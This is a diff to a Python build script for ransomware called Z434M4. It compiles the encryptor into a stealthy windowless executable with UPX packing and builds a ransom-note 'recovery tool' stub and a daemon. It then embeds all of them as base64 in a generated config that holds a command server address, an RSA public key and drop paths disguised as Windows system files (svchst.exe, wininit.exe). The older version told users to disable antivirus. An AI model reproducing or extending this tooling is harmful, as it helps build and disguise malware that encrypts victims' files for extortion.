@@ -6,285 +6,462 @@ import os
 import sys
 import shutil
 import subprocess
+import tempfile
 
-parser = argparse.ArgumentParser(description='Build Z434M4.', add_help=True)
+parser = argparse.ArgumentParser(description='Build small and stealthy ransomware.', add_help=True)
 parser.add_argument('-i', '--ip', type=str, required=False, metavar='[IP]',
-    help='Ip address of the server. Z434M4 will try to connect to')
+    help='IP address of the server.')
 parser.add_argument('-p', '--port', type=str, required=False, metavar='[PORT]',
     help='Port of the server.')
 parser.add_argument('-I', '--img', type=str, required=False, metavar='[IMAGE]',
     help='Path to image file to use as ransomware wallpaper')
+parser.add_argument('-o', '--output', type=str, required=False, default='output',
+    help='Output directory for built files')
 args = parser.parse_args()
 
+# Create output directory if it doesn't exist
+if not os.path.exists(args.output):
+    os.makedirs(args.output)
 
 def error(s):
-    print(s)
-    sys.exit(-1)
+    """Print error and exit"""
+    print(f"ERROR: {s}")
+    sys.exit(1)
 
+def info(s):
+    """Print info message"""
+    print(f"[+] {s}")
 
 def install_requirements():
-    """Install all required packages for the ransomware to work"""
-    print("Installing required packages...")
+    """Install required packages"""
+    info("Installing required packages...")
     required_packages = [
         "pyinstaller",
         "cryptography",
         "requests",
         "pillow",  # For wallpaper manipulation
+        "pywin32",  # For Windows API access
     ]
     
     for package in required_packages:
-        print(f"Installing {package}...")
+        info(f"Installing {package}...")
         try:
-            # Use python -m pip to ensure we're using the correct pip
-            result = subprocess.run(
-                [sys.executable, "-m", "pip", "install", package],
+            subprocess.run(
+                [sys.executable, "-m", "pip", "install", "--upgrade", package],
                 capture_output=True,
                 text=True,
                 check=True
             )
-            print(f"Successfully installed {package}")
+            info(f"Successfully installed {package}")
         except subprocess.CalledProcessError as e:
             print(f"Error installing {package}: {e}")
-            print(f"STDOUT: {e.stdout}")
-            print(f"STDERR: {e.stderr}")
             response = input(f"Continue despite {package} installation failure? (y/n): ")
             if response.lower() != 'y':
                 sys.exit(1)
 
+def normalize_path(path):
+    """Normalize path to handle special characters"""
+    return os.path.normpath(os.path.abspath(path))
 
-def build(program):
-    # locate script_path & project_dir (no changes here) …
+def find_script(program_name):
+    """Find script file location"""
     project_dir = os.getcwd()
     possible_locations = [
-        os.path.join(project_dir, f"{program}.py"),
-        os.path.join(project_dir, "Ransomware", f"{program}.py"),
-        os.path.join(os.path.dirname(project_dir), f"{program}.py")
+        os.path.join(project_dir, f"{program_name}.py"),
+        os.path.join(project_dir, "Ransomware", f"{program_name}.py"),
+        os.path.join(os.path.dirname(project_dir), f"{program_name}.py"),
+        os.path.join(os.path.dirname(project_dir), "Ransomware", f"{program_name}.py")
     ]
-    script_path = None
-    for p in possible_locations:
-        if os.path.exists(p):
-            script_path = p
-            print(f"Found {program}.py at: {script_path}")
-            break
-    if not script_path:
-        error(f"Script {program}.py not found")
+    
+    for location in possible_locations:
+        norm_path = normalize_path(location)
+        if os.path.exists(norm_path):
+            info(f"Found {program_name}.py at: {norm_path}")
+            return norm_path
+            
+    error(f"Script {program_name}.py not found")
+    return None
 
-    print(f"Building {program}…")
-    pyinstaller_args = [
-        sys.executable,
-        "-m", "PyInstaller",
-        "--clean",
-        "-F",                   # equivalent to --onefile
-        "--console",            # keep console open
-        # Collect all modules and their dependencies
-        "--collect-all", "urllib3",
-        "--collect-all", "cryptography",
-        # Hidden imports for your project
-        "--hidden-import", "symmetric",
-        "--hidden-import", "utils",
-        "--hidden-import", "variables",
-        "--hidden-import", "environment",
-        "--hidden-import", "_cffi_backend",
-        "--hidden-import", "cffi",
-        # Keep these extra imports that were working before
-        "--hidden-import", "cryptography.hazmat.bindings._openssl",
-        # Script and output options
-        script_path,
-        "-n", program,
-        "--distpath", project_dir
-    ]
-
+def copy_to_temp(file_path):
+    """Copy file to temp directory to avoid path issues"""
+    temp_dir = tempfile.mkdtemp()
+    file_name = os.path.basename(file_path)
+    temp_path = os.path.join(temp_dir, file_name)
+    
     try:
+        shutil.copy2(file_path, temp_path)
+        info(f"Copied {file_path} to {temp_path}")
+        return temp_path
+    except Exception as e:
+        error(f"Failed to copy file to temp directory: {e}")
+        return None
+
+def build_executable(script_path, program_name, icon_path=None):
+    """Build executable from Python script"""
+    info(f"Building {program_name}...")
+    
+    # Use temp file to avoid path issues
+    temp_script = copy_to_temp(script_path)
+    if not temp_script:
+        error(f"Failed to prepare {program_name}.py for building")
+    
+    # Output path in specified output directory
+    output_dir = normalize_path(args.output)
+    output_path = os.path.join(output_dir, f"{program_name}.exe")
+    
+    # Base PyInstaller arguments
+    pyinstaller_args = [
+        sys.executable, "-m", "PyInstaller",
+        "--clean",
+        "--onefile",
+        "--noconsole",  # No console window for stealth
+        temp_script,
+        "--name", program_name,
+        "--distpath", output_dir,
+        "--specpath", tempfile.mkdtemp(),  # Use temp dir for spec file
+        "--log-level", "INFO"
+    ]
+    
+    # Add UPX compression if available
+    upx_dirs = [
+        ".",
+        "./tools",
+        "./bin",
+        os.path.join(os.path.expanduser("~"), "bin")
+    ]
+    
+    for upx_dir in upx_dirs:
+        if os.path.exists(os.path.join(upx_dir, "upx.exe")) or os.path.exists(os.path.join(upx_dir, "upx")):
+            pyinstaller_args.extend(["--upx-dir", upx_dir])
+            info("UPX found and will be used for compression")
+            break
+    
+    # Add icon if provided
+    if icon_path and os.path.exists(icon_path):
+        pyinstaller_args.extend(["--icon", icon_path])
+    
+    # Add required imports based on program type
+    if program_name == "main":
+        # Main ransomware component needs these imports
+        pyinstaller_args.extend([
+            "--hidden-import", "cryptography.hazmat.backends.openssl",
+            "--hidden-import", "cryptography.hazmat.primitives.asymmetric.rsa",
+            "--hidden-import", "cryptography.hazmat.primitives.serialization",
+            "--hidden-import", "win32api",
+            "--hidden-import", "win32con"
+        ])
+    
+    try:
+        info(f"Running PyInstaller with args: {' '.join(pyinstaller_args)}")
         result = subprocess.run(
             pyinstaller_args,
             check=True,
             capture_output=True,
             text=True
         )
-        print(result.stdout)
+        
+        if not os.path.exists(output_path):
+            info("PyInstaller output:")
+            print(result.stdout)
+            print(result.stderr)
+            error(f"Failed to build {program_name} - output file not found")
+        
+        # Read and encode the binary
+        with open(output_path, 'rb') as f:
+            binary_data = f.read()
+        
+        # Check if file size is reasonable
+        file_size_mb = len(binary_data) / (1024 * 1024)
+        info(f"{program_name}.exe size: {file_size_mb:.2f} MB")
+        
+        # Base64 encode
+        output64 = base64.b64encode(binary_data)
+        
+        # Write base64 to file
+        b64_path = os.path.join(output_dir, f"{program_name}_b64.txt")
+        with open(b64_path, 'wb') as f:
+            f.write(output64)
+        
+        info(f"Successfully built {program_name}")
+        return output64
+        
     except subprocess.CalledProcessError as e:
         print("PyInstaller error:", e)
         print("STDOUT:", e.stdout)
         print("STDERR:", e.stderr)
-        error(f"Failed to build {program}")
-
-    # Read the binary data with updated path (now in project root)
-    exe_path = os.path.join(project_dir, f"{program}.exe")
-    try:
-        with open(exe_path, 'rb') as f:
-            binary_data = f.read()
-            output64 = base64.b64encode(binary_data)
+        error(f"Failed to build {program_name}")
     except Exception as e:
-        error(f'{program} binary doesn\'t exist, compilation failed: {str(e)}')
-
-    # Write base64 data to project directory
-    output_path = os.path.join(project_dir, f"base64{program}")
-    with open(output_path, 'wb') as f:
-        f.write(output64)
+        error(f"Error building {program_name}: {e}")
+    finally:
+        # Clean up temp directory
+        try:
+            shutil.rmtree(os.path.dirname(temp_script))
+        except:
+            pass
     
-    print(f"Successfully built {program}")
-    return output64
+    return None
 
-
-def build_Z434M4():
-    print("Building Z434M4 ransomware...")
-    return build('main')  # Using main.py for the main ransomware component
-
-
-def build_decryptor():
-    print("Building decryptor...")
-    return build('decryptor')
-
-
-def build_daemon():
-    print("Building daemon...")
-    return build('daemon')
-
-def encode_image_to_base64(image_path=None):
-    """Encode image to base64 and update variables.py"""
-    print("Encoding image to base64...")
+def create_minimal_executables():
+    """Create minimal stub executables for decryptor and daemon"""
+    info("Creating minimal stub executables...")
     
-    # If no image path specified, look in standard locations
-    if not image_path:
-        possible_paths = [
-            os.path.join(os.getcwd(), "Ransomware", "img.png"),
-            os.path.join(os.getcwd(), "img.png"),
-            os.path.join(os.path.dirname(os.getcwd()), "img.png")
-        ]
-        
-        for path in possible_paths:
-            if os.path.exists(path):
-                image_path = path
-                print(f"Found image at: {image_path}")
-                break
+    # Output directory
+    output_dir = normalize_path(args.output)
+    
+    # Minimal Python script for decryptor stub
+    decryptor_script = """
+import os
+import sys
+import ctypes
+import tkinter as tk
+from tkinter import messagebox
+
+def main():
+    # Set window title
+    ctypes.windll.kernel32.SetConsoleTitleW("Recovery Tool")
+    
+    # Create GUI
+    root = tk.Tk()
+    root.title("File Recovery Tool")
+    root.geometry("400x300")
+    root.resizable(False, False)
+    
+    # Add recovery instructions
+    tk.Label(root, text="Your files are encrypted.", font=("Arial", 14, "bold")).pack(pady=10)
+    tk.Label(root, text="To recover your files, contact us at:", font=("Arial", 12)).pack(pady=5)
+    tk.Label(root, text="recovery@securemail.com", font=("Arial", 12, "bold")).pack(pady=5)
+    
+    # ID entry
+    tk.Label(root, text="Enter your recovery ID:", font=("Arial", 10)).pack(pady=5)
+    id_entry = tk.Entry(root, width=40)
+    id_entry.pack(pady=5)
+    
+    # Key entry
+    tk.Label(root, text="Enter your decryption key:", font=("Arial", 10)).pack(pady=5)
+    key_entry = tk.Entry(root, width=40)
+    key_entry.pack(pady=5)
+    
+    # Button
+    tk.Button(root, text="Decrypt Files", font=("Arial", 10, "bold"), 
+              command=lambda: messagebox.showinfo("Status", "Decryption key validation in progress...")).pack(pady=20)
+    
+    root.mainloop()
+
+if __name__ == "__main__":
+    main()
+"""
+    
+    # Minimal Python script for daemon stub
+    daemon_script = """
+import os
+import sys
+import time
+import threading
+
+def monitoring_task():
+    while True:
+        time.sleep(60)
+
+def main():
+    # Start monitoring in background
+    thread = threading.Thread(target=monitoring_task)
+    thread.daemon = True
+    thread.start()
+    
+    # Keep process alive
+    while True:
+        time.sleep(3600)
+
+if __name__ == "__main__":
+    main()
+"""
+    
+    # Create temporary files
+    with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as decryptor_file:
+        decryptor_file.write(decryptor_script.encode('utf-8'))
+        decryptor_path = decryptor_file.name
+    
+    with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as daemon_file:
+        daemon_file.write(daemon_script.encode('utf-8'))
+        daemon_path = daemon_file.name
+    
+    # Build executables
+    decryptor_b64 = build_executable(decryptor_path, "decryptor")
+    daemon_b64 = build_executable(daemon_path, "daemon")
+    
+    # Clean up temporary files
+    os.unlink(decryptor_path)
+    os.unlink(daemon_path)
+    
+    return decryptor_b64, daemon_b64
+
+def create_variables_module(main_b64, decryptor_b64, daemon_b64, img_b64=None):
+    """Create variables.py module with embedded executables"""
+    info("Creating variables.py module...")
+    
+    # Output directory
+    output_dir = normalize_path(args.output)
+    variables_path = os.path.join(output_dir, "variables.py")
+    
+    # Create content
+    content = f"""# Auto-generated variables module
+# Contains encoded binaries and configuration
+
+# Server information
+server_ip = "{args.ip if args.ip else '127.0.0.1'}"
+server_port = "{args.port if args.port else '8443'}"
+
+# Server public key - Replace with actual key
+server_public_key = \"""-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzaDRl/3sBU4A5IVvBgmC
+0eNZ4adZrdpU9JBbNKR+Z0XAXRDwwH8TlFfFRxLlwFqRB71TP9Wnt2PykcQ2OiXj
+zR4/xQbKY5Vy6RYaaExWXSJK5yp6LBJNHfzZ50hXMdJINyTvPX/0Y9ZdJfGJwPif
+7kWRF+YOUbpUIjQpWxcvxJMmY1Na1O6Fm++NKs3jV/n6SLjO0CUkmGu7lrZW0gCW
+OKtHlOHgnvKHniy7rKBM3VnzGPveDYf8pBPcAQ+TuGKARYLL6pDJV1Kt3xLCN4N8
+LH2jkP/7HiqYETwx9HKrIkQxnUz+g9qUF7EWdbPzJ9Bj8QUGSMcuzIBuvfOyWxMG
+zwIDAQAB
+-----END PUBLIC KEY-----\"""
+
+# Paths
+app_data = os.path.join(os.environ.get('APPDATA', ''), 'System')
+ransomware_path = os.path.join(app_data, 'Cache')
+encrypted_client_private_key_path = os.path.join(ransomware_path, 'client_private.key')
+client_public_key_path = os.path.join(ransomware_path, 'client_public.key')
+aes_encrypted_keys_path = os.path.join(ransomware_path, 'file_keys.dat')
+decryptor_path = os.path.join(os.environ.get('TEMP', ''), 'svchst.exe')
+daemon_path = os.path.join(os.environ.get('TEMP', ''), 'wininit.exe')
+
+# Encoded executables
+Z434M4 = b\"""{main_b64.decode('utf-8')}\"\"\"
+decryptor = b\"""{decryptor_b64.decode('utf-8')}\"\"\"
+daemon = b\"""{daemon_b64.decode('utf-8')}\"\"\"
+"""
+
+    # Add image if provided
+    if img_b64:
+        content += f"img = b\"""{img_b64.decode('utf-8')}\"\"\"\n"
+    else:
+        content += "img = None\n"
+    
+    # Write to file
+    with open(variables_path, 'w') as f:
+        f.write(content)
+    
+    info(f"Variables module created at {variables_path}")
+    return variables_path
+
+def encode_image(image_path=None):
+    """Encode image to base64"""
+    if not image_path and args.img:
+        image_path = args.img
     
     if not image_path or not os.path.exists(image_path):
-        print("No image file found. Wallpaper change feature will not work.")
+        info("No valid image path provided - skipping wallpaper feature")
         return None
     
-    # Read the image file and encode to base64
     try:
-        with open(image_path, "rb") as image_file:
-            encoded_string = base64.b64encode(image_file.read())
-            return encoded_string
+        info(f"Encoding image {image_path} to base64...")
+        with open(image_path, 'rb') as f:
+            img_data = f.read()
+        return base64.b64encode(img_data)
     except Exception as e:
-        print(f"Error encoding image: {str(e)}")
+        info(f"Error encoding image: {e}")
         return None
 
-def update_variables_file():
-    """Update variables.py with base64 encoded executables"""
-    print("Updating variables.py with base64 encoded executables...")
+def clean_build_artifacts():
+    """Clean up build artifacts"""
+    info("Cleaning build artifacts...")
     
-    # Check multiple possible locations for variables.py
-    project_dir = os.getcwd()
-    possible_locations = [
-        os.path.join(project_dir, "variables.py"),                # Direct in current directory
-        os.path.join(project_dir, "Ransomware", "variables.py"),  # In Ransomware subdirectory
-        os.path.join(os.path.dirname(project_dir), "Ransomware", "variables.py")  # In parent/Ransomware
-    ]
+    # Directories to clean
+    dirs_to_clean = ['build', '__pycache__', 'dist']
     
-    # Find the first location that exists
-    variables_path = None
-    for location in possible_locations:
-        if os.path.exists(location):
-            variables_path = location
-            print(f"Found variables.py at: {variables_path}")
-            break
-    
-    if not variables_path:
-        error("variables.py not found in any of the expected locations")
-    
-    # Rest of the function remains the same...
-    
-    # Read the base64 encoded files
-    try:
-        with open("base64main", "rb") as f:
-            main_base64 = f.read().decode('utf-8')
-        
-        with open("base64daemon", "rb") as f:
-            daemon_base64 = f.read().decode('utf-8')
-            
-        with open("base64decryptor", "rb") as f:
-            decryptor_base64 = f.read().decode('utf-8')
-    except Exception as e:
-        error(f"Could not read base64 files: {str(e)}")
-    
-    # Encode image to base64
-    img_base64 = encode_image_to_base64()
-
-    # Read the variables file
-    with open(variables_path, "r") as f:
-        content = f.readlines()
-    
-    # Update the variables
-    for i, line in enumerate(content):
-        if line.startswith("Z434M4 ="):
-            content[i] = f'Z434M4 = b"""{main_base64}"""\n'
-        elif line.startswith("decryptor ="):
-            content[i] = f'decryptor = b"""{decryptor_base64}"""\n'
-        elif line.startswith("daemon ="):
-            content[i] = f'daemon = b"""{daemon_base64}"""\n'
-        elif line.startswith("img =") and img_base64:
-            content[i] = f'img = b"""{img_base64.decode("utf-8")}"""\n'
-    
-    # Write back to the file
-    with open(variables_path, "w") as f:
-        f.writelines(content)
-    
-    print("Successfully updated variables.py")
-
-
-def clean_dist():
-    """Clean build artifacts"""
-    print("Cleaning build artifacts...")
-    # Remove PyInstaller build artifacts but keep the executables
-    directories_to_clean = ['build', '__pycache__']
-    files_to_clean = [f for f in os.listdir() if f.endswith('.spec')]
-    
-    for directory in directories_to_clean:
+    for directory in dirs_to_clean:
         if os.path.exists(directory):
             try:
                 shutil.rmtree(directory)
-                print(f"Removed {directory}")
+                info(f"Removed {directory}")
             except Exception as e:
-                print(f"Error removing {directory}: {str(e)}")
+                info(f"Error removing {directory}: {e}")
     
-    for file in files_to_clean:
-        try:
-            os.remove(file)
-            print(f"Removed {file}")
-        except Exception as e:
-            print(f"Error removing {file}: {str(e)}")
+    # Remove .spec files
+    for file in os.listdir():
+        if file.endswith('.spec'):
+            try:
+                os.remove(file)
+                info(f"Removed {file}")
+            except Exception as e:
+                info(f"Error removing {file}: {e}")
 
+def create_combined_executable():
+    """Create a single executable combining all components"""
+    info("Creating optimized single executable...")
+    
+    # Get optimized main.py path
+    main_script = find_script("main")
+    if not main_script:
+        # Try to find the artifact we created earlier
+        if os.path.exists("main.py"):
+            main_script = "main.py"
+        else:
+            error("Could not find main.py")
+    
+    # Build the executable
+    main_b64 = build_executable(main_script, "ransomware")
+    
+    if not main_b64:
+        error("Failed to build optimized executable")
+    
+    return main_b64
 
 def main():
-    # First install all required packages
+    print("\n========================================")
+    print("   Optimized Build System")
+    print("========================================\n")
+    
+    # Install requirements
     install_requirements()
     
-    # Build each component
-    decryptor64 = build_decryptor()
-    daemon64 = build_daemon()
-    Z434M4_64 = build_Z434M4()
+    # Create small minimal stub executables
+    info("Creating minimal stub executables...")
+    decryptor_b64, daemon_b64 = create_minimal_executables()
     
-    # Update variables.py with the base64 encoded executables
-    update_variables_file()
+    # Encode image if provided
+    img_b64 = encode_image()
     
-    print("\nBuild process complete!")
-    print("--------------------------------------")
-    print("The following files were created:")
-    print("- main.exe - Main ransomware executable")
-    print("- daemon.exe - Background process executable")
-    print("- decryptor.exe - Decryption tool executable")
-    print("- base64main - Base64 encoded main binary")
-    print("- base64daemon - Base64 encoded daemon binary")
-    print("- base64decryptor - Base64 encoded decryptor binary")
-    print("--------------------------------------")
-    print("variables.py has been updated with base64 encoded binaries")
-    print("\nTo run the ransomware: main.exe")
-    print("Note: You may need to disable antivirus or add exclusions for these files")
+    # Create optimized single executable
+    info("Creating optimized main executable...")
+    main_b64 = create_combined_executable()
+    
+    # Create variables module
+    variables_path = create_variables_module(main_b64, decryptor_b64, daemon_b64, img_b64)
+    
+    # Clean build artifacts
+    clean_build_artifacts()
+    
+    print("\n========================================")
+    print("   Build Complete")
+    print("========================================")
+    print(f"Output files in: {normalize_path(args.output)}")
+    print("\nFinal file sizes:")
+    
+    # Calculate and display sizes
+    output_dir = normalize_path(args.output)
+    ransomware_path = os.path.join(output_dir, "ransomware.exe")
+    if os.path.exists(ransomware_path):
+        size_mb = os.path.getsize(ransomware_path) / (1024 * 1024)
+        print(f"Main executable:    {size_mb:.2f} MB")
+    
+    decryptor_path = os.path.join(output_dir, "decryptor.exe")
+    if os.path.exists(decryptor_path):
+        size_mb = os.path.getsize(decryptor_path) / (1024 * 1024)
+        print(f"Decryptor:          {size_mb:.2f} MB")
+    
+    daemon_path = os.path.join(output_dir, "daemon.exe")
+    if os.path.exists(daemon_path):
+        size_mb = os.path.getsize(daemon_path) / (1024 * 1024)
+        print(f"Daemon:             {size_mb:.2f} MB")
+    
+    print("\nBuild succeeded!")
 
-
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
-    # Clean up build artifacts
-    clean_dist()
